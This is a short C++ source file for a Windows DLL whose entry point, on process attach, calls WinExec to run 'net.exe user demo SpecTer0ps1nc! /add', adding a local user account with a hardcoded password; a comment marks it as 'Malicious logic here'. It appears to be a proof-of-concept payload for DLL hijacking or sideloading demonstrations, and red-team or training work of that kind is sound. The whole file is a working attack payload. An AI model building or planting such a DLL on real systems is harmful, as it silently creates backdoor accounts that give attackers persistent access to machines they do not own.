// dllmain.cpp : Defines the entry point for the DLL application.
#include "stdafx.h"

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
	char cmd[] = "C:\\Windows\\System32\\net.exe user demo SpecTer0ps1nc! /add";
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
		// Malicious logic here
		WinExec(cmd, SW_SHOW);
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

